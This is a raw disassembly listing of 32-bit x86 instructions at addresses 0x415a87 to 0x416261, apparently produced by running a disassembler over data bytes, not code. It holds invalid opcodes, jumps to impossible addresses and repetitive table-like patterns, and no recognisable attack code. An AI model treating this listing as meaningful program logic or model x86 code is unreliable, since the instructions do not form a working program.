  415a87:	imul   esi,DWORD PTR ds:0xb3a98e3c,0x2b
  415a8e:	xchg   esp,eax
  415a8f:	xor    al,0xd
  415a91:	sub    edx,esp
  415a93:	(bad)  
  415a94:	(bad)  
  415a96:	jno    0x415af7
  415a98:	cmp    BYTE PTR [ebx-0x9],cl
  415a9b:	fsubr  QWORD PTR [edi-0x77]
  415a9e:	add    al,0x29
  415aa0:	jmp    0x49b2:0x6cbd4974
  415aa7:	and    DWORD PTR [esi+0x19],0xffffff9c
  415aab:	out    dx,eax
  415aac:	imul   edi,DWORD PTR [ecx+0x42],0x8e2f01e3
  415ab3:	xor    DWORD PTR [edx+esi*1],edx
  415ab6:	xchg   BYTE PTR [ebx+edx*2],al
  415ab9:	mov    ds:0xe9b11b18,al
  415abe:	sbb    al,0x8f
  415ac0:	jg     0x415abe
  415ac2:	lock test eax,0x45f5c2f6
  415ac8:	xchg   ebx,eax
  415ac9:	dec    esi
  415aca:	cmp    DWORD PTR [ecx+0x34],eax
  415acd:	adc    BYTE PTR [ecx+0x79],dh
  415ad0:	clc    
  415ad1:	sbb    al,0xa5
  415ad3:	fs test eax,0x537e7c9e
  415ad9:	xor    bl,BYTE PTR [ebx]
  415adb:	std    
  415adc:	out    0x5,al
  415ade:	jne    0x415ad5
  415ae0:	ss cli 
  415ae2:	or     eax,0x2291309c
  415ae7:	sub    al,0x45
  415ae9:	retf   
  415aea:	das    
  415aeb:	or     BYTE PTR [eax+0x1f],cl
  415aee:	icebp  
  415aef:	popf   
  415af0:	aaa    
  415af1:	sbb    bl,BYTE PTR [eax-0x7345712a]
  415af7:	sbb    dl,BYTE PTR [ebx+edi*8-0x27]
  415afb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415afc:	int3   
  415afd:	mul    ah
  415aff:	mov    dh,0x8f
  415b01:	pop    ecx
  415b02:	jne    0x415a90
  415b04:	xlat   BYTE PTR ds:[ebx]
  415b05:	cmp    DWORD PTR [ebx],ebp
  415b07:	xor    BYTE PTR [ebx-0x21],al
  415b0a:	sti    
  415b0b:	dec    ebx
  415b0c:	xor    al,0x3f
  415b0e:	mov    dh,0x48
  415b10:	mov    esp,0x1768b206
  415b15:	je     0x415b4a
  415b17:	ins    BYTE PTR es:[edi],dx
  415b18:	mov    edx,0x144ec9a6
  415b1d:	and    ebp,0x919f2a8d
  415b23:	mov    ds:0xb26ee821,eax
  415b28:	push   ecx
  415b29:	stos   DWORD PTR es:[edi],eax
  415b2a:	mov    ebx,0xfa8717ff
  415b2f:	lahf   
  415b30:	fs push cs
  415b32:	dec    eax
  415b33:	push   esi
  415b34:	retf   0x1bb3
  415b37:	and    eax,0x22e16153
  415b3c:	fs (bad) 
  415b3f:	in     eax,0xdb
  415b41:	adc    al,0x6f
  415b43:	xor    BYTE PTR ds:0xfc904334,bl
  415b49:	test   eax,0x42c354c3
  415b4e:	and    al,0x3d
  415b50:	fisttp QWORD PTR [ebp+0x18]
  415b53:	repnz cmp DWORD PTR [esi+0x2d],0x75
  415b58:	frstor [edi+0x4d]
  415b5b:	add    DWORD PTR [ebx],esp
  415b5d:	call   0x909e2117
  415b62:	push   0xfcfa411
  415b67:	jecxz  0x415b65
  415b69:	retf   0x7b05
  415b6c:	jo     0x415aff
  415b6e:	or     eax,0x474b7d00
  415b73:	ror    DWORD PTR [ebx+0x5d],cl
  415b76:	xchg   ebx,eax
  415b77:	push   eax
  415b78:	pop    ecx
  415b79:	test   DWORD PTR [ebp-0x1320110d],esp
  415b7f:	xchg   DWORD PTR [esi-0x18de371f],eax
  415b85:	fucomi st,st(4)
  415b87:	test   DWORD PTR [edx],esp
  415b89:	add    edx,DWORD PTR [edi-0x363e80f5]
  415b8f:	mov    dh,0xea
  415b91:	push   es
  415b92:	or     BYTE PTR [ebp+0x7b8fe36],cl
  415b98:	or     DWORD PTR ds:0x627eea4a,ebx
  415b9e:	push   eax
  415b9f:	push   cs
  415ba0:	and    DWORD PTR [edx-0x6fd0ad3],0xd3ab2af1
  415baa:	sbb    eax,0x83d5d2d4
  415baf:	push   ebp
  415bb0:	ins    BYTE PTR es:[edi],dx
  415bb1:	cmp    BYTE PTR [ebx],0xff
  415bb4:	jg     0x415be5
  415bb6:	dec    ebp
  415bb7:	clc    
  415bb8:	xor    bh,0xe
  415bbb:	aas    
  415bbc:	cmc    
  415bbd:	sub    eax,0x25b319fc
  415bc2:	or     al,0x42
  415bc4:	sub    al,0xae
  415bc6:	adc    al,0x76
  415bc8:	dec    ebp
  415bc9:	dec    ebp
  415bca:	stos   DWORD PTR es:[edi],eax
  415bcb:	mov    esi,0x7cfe343c
  415bd0:	das    
  415bd1:	jno    0x415b78
  415bd3:	jge    0x415bf1
  415bd5:	scas   eax,DWORD PTR es:[edi]
  415bd6:	pop    ds
  415bd7:	leave  
  415bd8:	std    
  415bd9:	jp     0x415bf1
  415bdb:	mov    esi,DWORD PTR [edx+0x38]
  415bde:	adc    eax,0xc37a95dc
  415be3:	add    BYTE PTR ds:0xf69d9c37,bh
  415be9:	jmp    0x9c425dac
  415bee:	mov    WORD PTR [ebp-0x3276c96e],gs
  415bf4:	cmp    bh,0x2b
  415bf7:	(bad)  
  415bf9:	(bad)  
  415bfb:	add    edi,DWORD PTR [esi]
  415bfd:	xchg   edi,eax
  415bfe:	jle    0x415c33
  415c00:	fild   WORD PTR [ebx]
  415c02:	aad    0xc3
  415c04:	in     al,0x97
  415c06:	or     eax,0x2a1c27bc
  415c0b:	push   esp
  415c0c:	es pop ebp
  415c0e:	sub    dl,0xab
  415c11:	xchg   edi,eax
  415c12:	into   
  415c13:	fisub  WORD PTR [esi]
  415c15:	pusha  
  415c16:	leave  
  415c17:	ss data16 (bad) 
  415c1a:	cmp    ebp,DWORD PTR [ebx+edx*2]
  415c1d:	rcl    DWORD PTR [eax+0x8],1
  415c20:	sbb    DWORD PTR [ebp-0x5921f91e],edx
  415c26:	jp     0x415c65
  415c28:	call   0x7d1e:0x9f669373
  415c2f:	mov    edi,0x2425a23a
  415c34:	adc    DWORD PTR [edx-0x31493b1d],0xe00d55b6
  415c3e:	push   ecx
  415c3f:	aas    
  415c40:	add    eax,0x1e70fc30
  415c45:	leave  
  415c46:	repnz dec ebp
  415c48:	sbb    BYTE PTR [edi+0x53],ah
  415c4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c4c:	dec    edi
  415c4d:	xor    al,BYTE PTR [ebp+0x25]
  415c50:	inc    esp
  415c51:	jmp    0x6ed5:0x6ba65e39
  415c58:	sbb    bl,bh
  415c5a:	fwait
  415c5b:	mov    dl,0xbe
  415c5d:	int    0xe4
  415c5f:	sbb    bh,BYTE PTR [ebp-0x60ea4286]
  415c65:	mov    cl,0x32
  415c67:	adc    bh,BYTE PTR [ebx-0x38]
  415c6a:	jnp    0x415c14
  415c6c:	jmp    0x415c50
  415c6e:	and    eax,0xb86d45d7
  415c73:	lahf   
  415c74:	xchg   ebp,eax
  415c75:	sbb    DWORD PTR [esi+0x36297d6b],0x5c45944f
  415c7f:	sub    edi,DWORD PTR fs:[esi]
  415c82:	push   ss
  415c83:	mov    eax,ds:0x6333a83e
  415c88:	aas    
  415c89:	push   0x1c
  415c8b:	mov    ?,WORD PTR [ebp-0x13]
  415c8e:	cmp    edx,DWORD PTR [eax-0x1]
  415c91:	mov    dh,0x3c
  415c93:	xor    al,0x14
  415c95:	int    0xb6
  415c97:	icebp  
  415c98:	aad    0xfd
  415c9a:	out    0xcc,eax
  415c9c:	out    dx,al
  415c9d:	or     BYTE PTR [edi+0x1085be34],ch
  415ca3:	mov    al,BYTE PTR [edx]
  415ca5:	shr    BYTE PTR [ecx-0x6108c366],cl
  415cab:	sub    BYTE PTR [ebp+ebx*4+0x68],0xaa
  415cb0:	mov    ebp,0xcac392c8
  415cb5:	jge    0x415c87
  415cb7:	pop    edi
  415cb8:	imul   esi,DWORD PTR [esi+0x5f3d1114],0xaf9be529
  415cc2:	push   esp
  415cc3:	test   dl,bh
  415cc5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cc6:	mov    al,0x1e
  415cc8:	xchg   DWORD PTR [ecx+eiz*8-0x72b0f6f3],esi
  415ccf:	pop    edx
  415cd0:	dec    ebp
  415cd1:	add    ebp,DWORD PTR [esi]
  415cd3:	das    
  415cd4:	ror    DWORD PTR [edx+0x1387a1d2],cl
  415cda:	jns    0x415d42
  415cdc:	scas   eax,DWORD PTR es:[edi]
  415cdd:	sbb    eax,0x84bdbef8
  415ce2:	(bad)  
  415ce3:	fisubr DWORD PTR [ebp+0x7541dbc1]
  415ce9:	jno    0x415cbf
  415ceb:	inc    edi
  415cec:	test   eax,0xf82a8dcf
  415cf1:	rcl    BYTE PTR [eax-0x7d1a652f],cl
  415cf7:	fs mov edi,0x5d24ff8d
  415cfd:	lea    ebx,[ecx]
  415cff:	inc    edx
  415d00:	ins    BYTE PTR es:[edi],dx
  415d01:	test   al,0xb4
  415d03:	pop    ss
  415d04:	cmp    bl,BYTE PTR [eax+eax*8]
  415d07:	cmp    DWORD PTR [eax+edi*2+0x5c],esp
  415d0b:	ins    DWORD PTR es:[edi],dx
  415d0c:	cmp    al,0x13
  415d0e:	aam    0x8c
  415d10:	out    0x3a,al
  415d12:	xor    al,0xce
  415d14:	sub    DWORD PTR [ebx-0x3c9b6a12],esp
  415d1a:	test   DWORD PTR [edx+ecx*1],edx
  415d1d:	push   ebp
  415d1e:	cmp    cl,BYTE PTR [ebp-0x3f5d7fc0]
  415d24:	hlt    
  415d25:	lea    ecx,[ebx+0x19]
  415d28:	ret    
  415d29:	js     0x415d52
  415d2b:	mov    WORD PTR [edi+0x2b1d9795],fs
  415d31:	or     eax,edx
  415d33:	sub    al,BYTE PTR [edi-0x19a8fbe4]
  415d39:	cmp    eax,0x670d6b26
  415d3e:	fiadd  WORD PTR [ecx-0x646084b9]
  415d44:	pop    ecx
  415d45:	daa    
  415d46:	std    
  415d47:	add    eax,DWORD PTR [esi+0x79]
  415d4a:	and    eax,0x3e3d86c
  415d4f:	mov    esp,DWORD PTR [ebp+0x7]
  415d52:	pop    es
  415d53:	dec    edx
  415d54:	mov    eax,ds:0x87aac149
  415d59:	jle    0x415d15
  415d5b:	push   es
  415d5c:	ins    DWORD PTR es:[edi],dx
  415d5d:	popf   
  415d5e:	mov    al,0x3a
  415d60:	jecxz  0x415daf
  415d62:	xchg   DWORD PTR [esi],ebx
  415d64:	jl     0x415cfe
  415d66:	xor    al,BYTE PTR [ecx-0x3e315541]
  415d6c:	mov    BYTE PTR [esi-0x45],dl
  415d6f:	jmp    DWORD PTR ds:0xe7b39965
  415d75:	sub    BYTE PTR [ebp+0x22baa2fc],0x10
  415d7c:	cli    
  415d7d:	lods   al,BYTE PTR ds:[esi]
  415d7e:	outs   dx,BYTE PTR ds:[esi]
  415d7f:	inc    ebx
  415d80:	shl    DWORD PTR [edi],1
  415d82:	xor    cl,BYTE PTR [ecx]
  415d84:	jns    0x415dca
  415d86:	jno    0x415e06
  415d88:	std    
  415d89:	scas   al,BYTE PTR es:[edi]
  415d8a:	popa   
  415d8b:	xchg   ebx,eax
  415d8c:	sub    ah,BYTE PTR [edi-0x12]
  415d8f:	sub    ebx,DWORD PTR [ebp+esi*2+0x49]
  415d93:	dec    edx
  415d94:	push   ss
  415d95:	or     bl,al
  415d97:	pop    ebx
  415d98:	mov    edx,0x76d27489
  415d9d:	mov    cs:0x64e8a7ba,al
  415da3:	add    al,BYTE PTR [edi]
  415da5:	mov    dl,0x0
  415da7:	es xchg esp,eax
  415da9:	xchg   esi,eax
  415daa:	mov    bh,0xe4
  415dac:	stos   DWORD PTR es:[edi],eax
  415dad:	sub    ebp,ecx
  415daf:	scas   eax,DWORD PTR es:[edi]
  415db0:	push   ebx
  415db1:	sub    al,0x91
  415db3:	sub    dh,BYTE PTR [ebp+0x10d7b99e]
  415db9:	and    eax,0xcfc00e87
  415dbe:	je     0x415d62
  415dc0:	mov    ds:0xac26718e,eax
  415dc5:	in     eax,dx
  415dc6:	pop    ebp
  415dc7:	pop    ecx
  415dc8:	sti    
  415dc9:	jmp    0xe0e0ec6c
  415dce:	int    0x54
  415dd0:	pop    ebp
  415dd1:	pop    ds
  415dd2:	mov    ebp,0x715d64da
  415dd7:	iret   
  415dd8:	stos   BYTE PTR es:[edi],al
  415dd9:	push   0x1d
  415ddb:	ins    BYTE PTR es:[edi],dx
  415ddc:	(bad)  
  415dde:	in     eax,0x90
  415de0:	nop
  415de1:	in     eax,0x26
  415de3:	imul   edx,DWORD PTR [edx],0x6d
  415de6:	int3   
  415de7:	pop    eax
  415de8:	push   eax
  415de9:	in     al,0x67
  415deb:	jle    0x415da6
  415ded:	shl    DWORD PTR [ebx+0x14],1
  415df0:	push   0x78
  415df2:	sub    bl,cl
  415df4:	pop    eax
  415df5:	sub    BYTE PTR [esi],dl
  415df7:	in     al,0x5a
  415df9:	scas   eax,DWORD PTR es:[edi]
  415dfa:	iret   
  415dfb:	jns    0x415e3a
  415dfd:	addr16 dec ecx
  415dff:	add    BYTE PTR [ebp+ebx*4+0x21c4df91],al
  415e06:	sbb    eax,0xa3e1f9cf
  415e0b:	call   0xfaad688a
  415e10:	ror    BYTE PTR [edx],1
  415e12:	or     bh,bl
  415e14:	mov    DWORD PTR [ebp+0x36],ecx
  415e17:	sbb    al,0x30
  415e19:	gs fs jmp 0x415e8c
  415e1d:	xchg   ecx,eax
  415e1e:	dec    ebx
  415e1f:	les    esp,FWORD PTR [esi+0x2b]
  415e22:	clc    
  415e23:	mov    al,ds:0x899065c3
  415e28:	cli    
  415e29:	(bad)  
  415e2a:	pushf  
  415e2b:	in     eax,0x14
  415e2d:	int    0xb6
  415e2f:	xchg   ecx,eax
  415e30:	adc    al,0xc0
  415e32:	adc    dl,BYTE PTR ds:0x6c1c7ca2
  415e38:	int    0xb3
  415e3a:	retf   
  415e3b:	clc    
  415e3c:	outs   dx,BYTE PTR ds:[esi]
  415e3d:	dec    esi
  415e3e:	fstp   TBYTE PTR [edx]
  415e40:	test   eax,0x34bf59c1
  415e45:	cld    
  415e46:	push   DWORD PTR [ebx+0x33]
  415e49:	push   ss
  415e4a:	jb     0x415e0a
  415e4c:	cli    
  415e4d:	dec    ebp
  415e4e:	and    al,0x6a
  415e50:	out    0x6a,al
  415e52:	bound  eax,QWORD PTR ds:[ebp-0x38]
  415e56:	jno    0x415e90
  415e58:	mov    esi,0xee9cae01
  415e5d:	jnp    0x415e0b
  415e5f:	pop    eax
  415e60:	aas    
  415e61:	test   DWORD PTR [ebp-0x60],0xd9c8b804
  415e68:	adc    ch,BYTE PTR [ebp+0x38]
  415e6b:	clc    
  415e6c:	xchg   dl,ch
  415e6e:	mov    eax,0x26ee2d68
  415e73:	int3   
  415e74:	int3   
  415e75:	retf   
  415e76:	stc    
  415e77:	nop
  415e78:	div    BYTE PTR [edi*4+0x40ae3b2f]
  415e7f:	and    eax,0x40a775b
  415e84:	mov    edi,0x442adccb
  415e89:	xor    al,0xd0
  415e8b:	call   0x5f3e:0xb3181c70
  415e92:	outs   dx,BYTE PTR ds:[esi]
  415e93:	xchg   DWORD PTR [ecx+eiz*8+0x77372e04],esi
  415e9a:	mov    ebx,0x3590277c
  415e9f:	arpl   WORD PTR [esi-0x59],cx
  415ea2:	std    
  415ea3:	push   esi
  415ea4:	inc    ebx
  415ea5:	pop    edi
  415ea6:	inc    edx
  415ea7:	mov    eax,ds:0xc20ee6d4
  415eac:	ins    BYTE PTR es:[edi],dx
  415ead:	(bad)  
  415eae:	mov    al,ds:0xf031fad3
  415eb3:	sub    eax,0x8558aa53
  415eb8:	movmskps esp,xmm0
  415ebb:	outs   dx,BYTE PTR ds:[esi]
  415ebc:	ins    DWORD PTR es:[edi],dx
  415ebd:	cmp    edi,esi
  415ebf:	adc    DWORD PTR [ebx-0x3a18320d],0xc538dd0
  415ec9:	sub    edi,DWORD PTR [ebx]
  415ecb:	(bad)  
  415ecd:	and    BYTE PTR [esp+ebp*1],al
  415ed0:	scas   al,BYTE PTR es:[edi]
  415ed1:	sbb    al,0x4
  415ed3:	call   0x728e3d53
  415ed8:	xor    edi,DWORD PTR ds:0x84097cee
  415ede:	push   edi
  415edf:	push   edx
  415ee0:	ret    0x7a16
  415ee3:	jne    0x415ecf
  415ee5:	and    eax,0x310b2ad7
  415eea:	or     edi,esp
  415eec:	outs   dx,BYTE PTR ds:[esi]
  415eed:	mov    cl,BYTE PTR [eax-0x2e64dfe9]
  415ef3:	mov    ebp,0xe40e3888
  415ef8:	or     eax,0x9aaf608a
  415efd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415efe:	xchg   ebp,eax
  415eff:	mov    dl,0xbe
  415f01:	dec    esi
  415f02:	popf   
  415f03:	aaa    
  415f04:	push   0x5c
  415f06:	iret   
  415f07:	xlat   BYTE PTR ds:[ebx]
  415f08:	jbe    0x415ecf
  415f0a:	push   esi
  415f0b:	sbb    edx,DWORD PTR [esi]
  415f0d:	or     ah,BYTE PTR [edx+0x7f5a7b93]
  415f13:	add    esi,DWORD PTR [esi]
  415f15:	stos   DWORD PTR es:[edi],eax
  415f16:	mov    bh,ch
  415f18:	stos   DWORD PTR es:[edi],eax
  415f19:	outs   dx,DWORD PTR ds:[esi]
  415f1a:	cmp    dh,0x2d
  415f1d:	out    0xd6,al
  415f1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f20:	movzx  edx,dh
  415f23:	into   
  415f24:	or     ebx,DWORD PTR [eax-0x60]
  415f27:	(bad)  
  415f28:	jmp    0x415f94
  415f2a:	pop    ecx
  415f2b:	enter  0xf637,0x69
  415f2f:	xchg   esp,eax
  415f30:	inc    esp
  415f31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f32:	ret    0x6266
  415f35:	cld    
  415f36:	xchg   esp,eax
  415f37:	enter  0x86d8,0x20
  415f3b:	pop    esp
  415f3c:	div    DWORD PTR [ebx-0x7b]
  415f3f:	scas   al,BYTE PTR es:[edi]
  415f40:	lds    edx,FWORD PTR [ecx+ebx*4]
  415f43:	or     ebx,DWORD PTR [edx+edx*4-0x53378db0]
  415f4a:	pop    ds
  415f4b:	jo     0x415f4e
  415f4d:	mov    eax,ds:0xffeb8cb1
  415f52:	fadd   DWORD PTR [ecx+0x24]
  415f55:	inc    ebp
  415f56:	mov    BYTE PTR [ecx-0x50207dfa],0xb5
  415f5d:	retf   
  415f5e:	push   edx
  415f5f:	mov    ds:0x2b5b8b3e,eax
  415f64:	retf   
  415f65:	mov    ds:0xa3f73c13,eax
  415f6a:	sub    DWORD PTR [ebx+0x5ea66396],ebp
  415f70:	scas   eax,DWORD PTR es:[edi]
  415f71:	cmp    BYTE PTR [esi+0xc78f392],ch
  415f77:	mov    esi,0x9c9ab956
  415f7c:	jge    0x415f1f
  415f7e:	cdq    
  415f7f:	sar    BYTE PTR [ebp-0x5b],1
  415f82:	push   edi
  415f83:	sbb    al,BYTE PTR [edx+0x6e]
  415f86:	sbb    BYTE PTR [edx+eiz*8+0x6957b5ae],ah
  415f8d:	lods   eax,DWORD PTR ds:[esi]
  415f8e:	push   DWORD PTR [esp+ebx*4+0x77423a86]
  415f95:	or     edx,DWORD PTR ds:0x90853f84
  415f9b:	cmp    al,BYTE PTR [eax]
  415f9d:	add    BYTE PTR [eax],al
  415f9f:	add    BYTE PTR [eax],al
  415fa1:	add    BYTE PTR [eax],al
  415fa3:	adc    BYTE PTR [eax],al
  415fa5:	add    ah,ch
  415fa7:	add    BYTE PTR [eax],al
  415fa9:	add    BYTE PTR [edx],ch
  415fab:	xor    BYTE PTR [eax],dh
  415fad:	xor    BYTE PTR ds:0x58304c30,dh
  415fb3:	xor    BYTE PTR [esi+0x30],bl
  415fb6:	xor    BYTE PTR fs:[eax-0x65cf71d0],cl
  415fbd:	xor    BYTE PTR [eax-0x4ccf59d0],ah
  415fc3:	xor    al,al
  415fc5:	xor    bh,cl
  415fc7:	xor    BYTE PTR [edx-0x48ce51cf],ch
  415fcd:	xor    esp,eax
  415fcf:	xor    eax,ecx
  415fd1:	xor    DWORD PTR [ebp-0x60cc6ece],esp
  415fd7:	xor    ebp,DWORD PTR [esi-0x3acc47cd]
  415fdd:	xor    edx,ebp
  415fdf:	xor    ebx,ebp
  415fe1:	xor    esp,esp
  415fe3:	xor    ebp,edi
  415fe5:	xor    edi,ebp
  415fe7:	xor    ecx,DWORD PTR [eax]
  415fe9:	xor    al,0xc
  415feb:	xor    al,0x14
  415fed:	xor    al,0x28
  415fef:	xor    al,0x2e
  415ff1:	xor    al,0x40
  415ff3:	xor    al,0x46
  415ff5:	xor    al,0xf8
  415ff7:	xor    eax,0x360435fc
  415ffc:	push   cs
  415ffd:	sbb    esi,DWORD PTR ss:[esi]
  416000:	sub    esi,DWORD PTR [esi]
  416002:	xor    DWORD PTR [esi],esi
  416004:	cmp    eax,0x48364336
  416009:	ss dec esi
  41600b:	ss pop esp
  41600d:	ss push 0x7f367b36
  416013:	ss pop edi
  416015:	aaa    
  416016:	imul   esi,DWORD PTR [edi],0x7e
  416019:	aaa    
  41601a:	xor    BYTE PTR [edi],0x8d
  41601d:	aaa    
  41601e:	call   0xb637:0xb037a937
  416025:	aaa    
  416026:	ret    
  416027:	aaa    
  416028:	shl    DWORD PTR [edi],cl
  41602a:	mov    ah,0x38
  41602c:	mov    ebp,0xce38ca38
  416031:	cmp    dh,dl
  416033:	cmp    dl,ah
  416035:	cmp    dl,dh
  416037:	cmp    dh,dh
  416039:	cmp    BYTE PTR [ebx-0x33c53fc6],dh
  41603f:	cmp    ah,dl
  416041:	cmp    ch,dh
  416043:	cmp    dh,ch
  416045:	cmp    bh,bl
  416047:	cmp    al,BYTE PTR [edi]
  416049:	cmp    ecx,DWORD PTR [ebx+edi*1]
  41604c:	adc    eax,0x2a3b1b3b
  416051:	cmp    esi,DWORD PTR [ecx]
  416053:	cmp    esi,DWORD PTR [edi]
  416055:	cmp    eax,DWORD PTR [ebx+edi*1+0x30]
  416059:	cmp    al,0x34
  41605b:	cmp    al,0x3e
  41605d:	cmp    al,0x44
  41605f:	cmp    al,0x49
  416061:	cmp    al,0x52
  416063:	cmp    al,0x5b
  416065:	cmp    al,0x6a
  416067:	cmp    al,0x71
  416069:	cmp    al,0x77
  41606b:	cmp    al,0x84
  41606d:	cmp    al,0x9d
  41606f:	cmp    al,0xa6
  416071:	cmp    al,0xac
  416073:	cmp    al,0xb9
  416075:	cmp    al,0xc0
  416077:	cmp    al,0xce
  416079:	cmp    al,0xd7
  41607b:	cmp    al,0xba
  41607d:	cmp    eax,0x3dd13dc4
  416082:	loope  0x4160c1
  416084:	out    0x3d,eax
  416086:	hlt    
  416087:	cmp    eax,0x3e013dfb
  41608c:	or     BYTE PTR [esi],bh
  41608e:	add    BYTE PTR [eax],ah
  416090:	add    BYTE PTR [eax],al
  416092:	dec    eax
  416093:	add    BYTE PTR [eax],al
  416095:	add    BYTE PTR [ebx],bh
  416097:	cmp    al,0x4c
  416099:	cmp    al,0x52
  41609b:	cmp    al,0x58
  41609d:	cmp    al,0x65
  41609f:	cmp    al,0x73
  4160a1:	cmp    al,0x7f
  4160a3:	cmp    al,0x85
  4160a5:	cmp    al,0x94
  4160a7:	cmp    al,0x9a
  4160a9:	cmp    al,0xa5
  4160ab:	cmp    al,0xaf
  4160ad:	cmp    al,0xb6
  4160af:	cmp    al,0xbc
  4160b1:	cmp    al,0xc8
  4160b3:	cmp    al,0xd6
  4160b5:	cmp    al,0xdc
  4160b7:	cmp    al,0xe9
  4160b9:	cmp    al,0xf0
  4160bb:	cmp    al,0xf6
  4160bd:	cmp    al,0x9
  4160bf:	cmp    eax,0x3d203d13
  4160c4:	sub    al,0x3d
  4160c6:	xor    DWORD PTR ds:0x3d403d3b,edi
  4160cc:	inc    ebp
  4160cd:	cmp    eax,0x3d513d4b
  4160d2:	pop    eax
  4160d3:	cmp    eax,0x30000000
  4160d8:	add    BYTE PTR [eax],al
  4160da:	or     al,0x1
  4160dc:	add    BYTE PTR [eax],al
  4160de:	push   ebx
  4160df:	xor    bl,BYTE PTR [ecx+0x32]
  4160e2:	xor    ch,BYTE PTR gs:[ebx+0x32]
  4160e6:	jae    0x41611a
  4160e8:	jns    0x41611c
  4160ea:	test   BYTE PTR [edx],dh
  4160ec:	mov    BYTE PTR [edx],dh
  4160ee:	(bad)  
  4160ef:	xor    bl,BYTE PTR [esi-0x54cd5ace]
  4160f5:	xor    bh,BYTE PTR [eax-0x27cd36ce]
  4160fb:	xor    ah,dh
  4160fd:	xor    ch,dl
  4160ff:	xor    bh,cl
  416101:	xor    bh,bh
  416103:	xor    ah,BYTE PTR [ecx+0x34]
  416106:	addr16 xor al,0x1d
  416109:	xor    eax,0x35333529
  41610e:	cmp    BYTE PTR ds:0x355a3543,dh
  416114:	arpl   WORD PTR ds:0x357a356d,si
  41611a:	xchg   BYTE PTR ds:0x3591358b,dh
  416120:	xchg   esi,eax
  416121:	xor    eax,0x35a7359c
  416126:	mov    ebx,0xce35c135
  41612b:	xor    eax,0x3758374f
  416130:	pop    esi
  416131:	aaa    
  416132:	jb     0x41616b
  416134:	jnp    0x41616d
  416136:	test   DWORD PTR [edi],esi
  416138:	mov    WORD PTR [edi],?
  41613a:	xchg   edx,eax
  41613b:	aaa    
  41613c:	sahf   
  41613d:	aaa    
  41613e:	lods   al,BYTE PTR ds:[esi]
  41613f:	aaa    
  416140:	mov    dl,0x37
  416142:	shl    DWORD PTR [edi],0xc8
  416145:	aaa    
  416146:	into   
  416147:	aaa    
  416148:	(bad)  [edi]
  41614a:	call   0x12796486
  41614f:	cmp    BYTE PTR [ecx],bl
  416151:	cmp    BYTE PTR [edi],bl
  416153:	cmp    BYTE PTR [eax+edi*1],ch
  416156:	cmp    eax,0x49384338
  41615b:	cmp    BYTE PTR [esi+0x38],dl
  41615e:	pop    ebp
  41615f:	cmp    BYTE PTR [eax+0x38],ch
  416162:	mov    BYTE PTR [eax],bh
  416164:	xchg   esp,eax
  416165:	cmp    BYTE PTR [ecx-0x43c74ec8],ah
  41616b:	cmp    dh,cl
  41616d:	cmp    ch,bl
  41616f:	cmp    ah,ah
  416171:	cmp    dl,ch
  416173:	cmp    bh,dh
  416175:	cmp    BYTE PTR [esi],cl
  416177:	cmp    DWORD PTR [ecx],ebx
  416179:	cmp    DWORD PTR [esi],esp
  41617b:	cmp    DWORD PTR [edi-0x4fc55bc6],edx
  416181:	cmp    bh,BYTE PTR [edx+edi*1+0x3ae63ac8]
  416188:	idiv   DWORD PTR [edx]
  41618a:	(bad)  
  41618b:	cmp    al,BYTE PTR [ebx+edi*1]
  41618e:	adc    DWORD PTR [ebx],edi
  416190:	and    DWORD PTR [ebx],edi
  416192:	daa    
  416193:	cmp    esi,DWORD PTR [esi]
  416195:	cmp    edi,DWORD PTR ds:0x593b483b
  41619b:	cmp    esp,DWORD PTR [eax+0x3b]
  41619e:	cmp    si,WORD PTR [ebx+0x3b]
  4161a2:	xchg   edx,eax
  4161a3:	cmp    ebx,DWORD PTR [edi+0x163ba73b]
  4161a9:	cmp    eax,0x3d273d20
  4161ae:	sub    eax,0x433d3d3d
  4161b3:	cmp    eax,0x3d5f3d50
  4161b8:	jae    0x4161f7
  4161ba:	jle    0x4161f9
  4161bc:	xchg   BYTE PTR ds:0x3d9c3d96,bh
  4161c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4161c3:	cmp    eax,0x3dbc3daf
  4161c8:	retf   
  4161c9:	cmp    eax,0x3dd73dd1
  4161ce:	fidivr WORD PTR ds:0x3df83de9
  4161d4:	(bad)  
  4161d5:	cmp    eax,0x3e123e05
  4161da:	dec    ebx
  4161db:	ds push ecx
  4161dd:	ds pop esi
  4161df:	ds gs add BYTE PTR ds:[eax+0x0],dl
  4161e5:	add    BYTE PTR [eax+0x26000000],cl
  4161eb:	xor    DWORD PTR [ebx],esi
  4161ed:	xor    DWORD PTR [edx+0x31],eax
  4161f0:	dec    ecx
  4161f1:	xor    DWORD PTR [edi+0x31],ecx
  4161f4:	pop    esp
  4161f5:	xor    DWORD PTR [esi+0x31],ebp
  4161f8:	ja     0x41622b
  4161fa:	xor    DWORD PTR [ecx],0xffffff89
  4161fd:	xor    edx,eax
  4161ff:	xor    edx,ebx
  416201:	xor    edx,edi
  416203:	xor    esp,ebp
  416205:	xor    esi,edi
  416207:	xor    eax,DWORD PTR [ebx]
  416209:	xor    al,0x7
  41620b:	xor    al,0x10
  41620d:	xor    al,0x1a
  41620f:	xor    al,0x27
  416211:	xor    al,0x33
  416213:	xor    al,0x38
  416215:	xor    al,0x3e
  416217:	xor    al,0x43
  416219:	xor    al,0x49
  41621b:	xor    al,0xb6
  41621d:	xor    eax,0x35d135be
  416222:	xlat   BYTE PTR ds:[ebx]
  416223:	xor    eax,0x386d3727
  416228:	jno    0x416262
  41622a:	jle    0x416264
  41622c:	mov    bh,BYTE PTR [eax]
  41622e:	xchg   ecx,eax
  41622f:	cmp    BYTE PTR [edi-0x53c759c8],dl
  416235:	cmp    BYTE PTR [edx-0x54c489c8],dh
  41623b:	cmp    al,0xb3
  41623d:	cmp    al,0xb9
  41623f:	cmp    al,0xbd
  416241:	cmp    al,0xcf
  416243:	cmp    al,0xdf
  416245:	cmp    al,0xea
  416247:	cmp    al,0xee
  416249:	cmp    al,0xf5
  41624b:	cmp    al,0xfc
  41624d:	cmp    al,0x6
  41624f:	cmp    eax,0x3d2d3d13
  416254:	xor    edi,DWORD PTR ds:0x3d493d42
  41625a:	dec    edi
  41625b:	cmp    eax,0x3d613d56
  416260:	lahf   
  416261:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
